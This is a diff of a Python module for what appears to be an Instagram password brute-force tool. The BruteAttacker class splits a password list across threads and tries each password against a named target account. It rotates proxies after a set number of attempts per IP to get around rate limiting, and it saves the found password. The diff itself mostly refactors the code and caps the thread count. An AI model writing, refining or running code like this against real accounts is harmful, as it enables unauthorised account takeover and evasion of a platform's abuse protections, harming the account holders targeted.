@@ -1,21 +1,23 @@
 #!/usr/bin/env python3
-import os
-import time
 import json
+import os
 import random
 import threading
-from datetime import datetime
+import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from .session_manager import InstagramSession
+from datetime import datetime
+
+from .banner import G, R, RE, Y
+from .config import COOLDOWN_PERIOD, MAX_ATTEMPTS_PER_IP, OUTPUT_DIR
 from .proxy_rotator import ProxyRotator
-from .config import OUTPUT_DIR, MAX_ATTEMPTS_PER_IP, COOLDOWN_PERIOD
-from .banner import R, Y, G, RE
+from .session_manager import InstagramSession
+
 
 class BruteAttacker:
     def __init__(self, username, passwords, proxy_rotator=None):
         self.username = username
-        self.passwords = passwords
-        self.total_passwords = len(passwords)
+        self.passwords = list(passwords)
+        self.total_passwords = len(self.passwords)
         self.proxy_rotator = proxy_rotator or ProxyRotator()
         self.attempted = 0
         self.found = False
@@ -23,7 +25,10 @@ class BruteAttacker:
         self.lock = threading.Lock()
         self.stop_flag = threading.Event()
         os.makedirs(OUTPUT_DIR, exist_ok=True)
-        self.results_file = os.path.join(OUTPUT_DIR, f"{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
+        self.results_file = os.path.join(
+            OUTPUT_DIR,
+            f"{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
+        )
         self.stats = {
             "start_time": datetime.now().isoformat(),
             "attempts": 0,
@@ -34,18 +39,18 @@ class BruteAttacker:
             "found_password": None,
         }
 
-    def start_attack(self, threads=3, callback=None):
+    def start_attack(self, threads=2, callback=None):
         print(f"\n{R}[!] Starting Brute Force Attack{RE}")
         print(f"{Y}[*] Target: @{self.username}{RE}")
         print(f"{Y}[*] Passwords to test: {self.total_passwords:,}{RE}")
         print(f"{Y}[*] Threads: {threads}{RE}")
-        print(f"{Y}[*] Strategy: Smart rotation with random delays{RE}")
         print(f"{R}{'=' * 60}{RE}\n")
 
         if self.total_passwords == 0:
             print(f"{R}[!] No passwords to test{RE}")
             return None
 
+        threads = max(1, min(5, int(threads)))
         chunk_size = max(1, self.total_passwords // threads)
         chunks = []
         for i in range(threads):
@@ -54,7 +59,10 @@ class BruteAttacker:
             chunks.append(self.passwords[start:end])
 
         with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [executor.submit(self._attack_worker, chunk, i, callback) for i, chunk in enumerate(chunks)]
+            futures = [
+                executor.submit(self._attack_worker, chunk, i, callback)
+                for i, chunk in enumerate(chunks)
+            ]
             for future in as_completed(futures):
                 if self.found:
                     self.stop_flag.set()
@@ -75,7 +83,6 @@ class BruteAttacker:
             print(f"{G}{'=' * 60}{RE}\n")
         else:
             print(f"\n{Y}[!] Password not found in generated list{RE}")
-            print(f"{Y}[!] Consider adding more personal information{RE}")
         return self.correct_password
 
     def _attack_worker(self, password_chunk, worker_id, callback=None):
@@ -92,9 +99,9 @@ class BruteAttacker:
                 self.stats["attempts"] += 1
                 current_attempt = self.attempted
 
-            if local_attempts >= MAX_ATTEMPTS_PER_IP or not session:
+            if local_attempts >= MAX_ATTEMPTS_PER_IP or session is None:
                 proxy = self.proxy_rotator.get_next_proxy()
-                if session:
+                if session is not None:
                     try:
                         session.reset_session()
                     except Exception:
@@ -116,7 +123,11 @@ class BruteAttacker:
                 self.stop_flag.set()
                 return
 
-            error_type = response.get("error", "unknown") if isinstance(response, dict) else "unknown"
+            error_type = (
+                response.get("error", "unknown")
+                if isinstance(response, dict)
+                else "unknown"
+            )
             if error_type == "rate_limited":
                 with self.lock:
                     self.stats["rate_limited"] += 1
@@ -146,7 +157,7 @@ class BruteAttacker:
                     f"Rotations: {self.stats['proxy_rotations']}"
                 )
 
-        if session:
+        if session is not None:
             try:
                 session.reset_session()
             except Exception:
